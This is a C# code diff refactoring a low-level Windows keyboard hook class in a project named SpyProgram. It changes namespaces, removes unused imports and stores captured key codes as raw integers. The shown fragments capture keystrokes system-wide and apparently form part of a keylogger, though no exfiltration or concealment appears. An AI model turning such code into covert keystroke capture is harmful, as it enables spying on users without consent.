@@ -1,15 +1,9 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Diagnostics;
-using System.Linq;
 using System.Runtime.InteropServices;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows.Forms;
-using static SpyProgram.WINAPI.User32;
-using static SpyProgram.WINAPI.WindowsAPIHelper;
+using static SpyProgram.Windows.WINAPI.User32;
+using static SpyProgram.Windows.WINAPI.WindowsAPIHelper;
 
-namespace SpyProgram.WINAPI
+namespace SpyProgram.Windows.WINAPI
 {
     public class LowLevelKeyboardHook
     {
@@ -26,7 +20,7 @@ namespace SpyProgram.WINAPI
             Injected
         }
 
-        public delegate void HookStuff(Keys key, KeyInjectionType injectionType, bool isExtendedKey, bool isAltPressed, KeyStatus keyStatus);
+        public delegate void HookStuff(uint key, KeyInjectionType injectionType, bool isExtendedKey, bool isAltPressed, KeyStatus keyStatus);
         public event HookStuff HookActivated;
 
         private HookProc procedure;
@@ -68,8 +62,8 @@ namespace SpyProgram.WINAPI
 
             KeyFlag flag = (KeyFlag)wParam;
             KBDLLHOOKSTRUCT hookStruct = Marshal.PtrToStructure<KBDLLHOOKSTRUCT>(lParam);
-            
-            Keys key = (Keys)hookStruct.virtualKeyCode;
+
+            uint key = hookStruct.virtualKeyCode;
             bool isExtendedKey;
             bool isAltPressed;
             KeyStatus keyStatus;
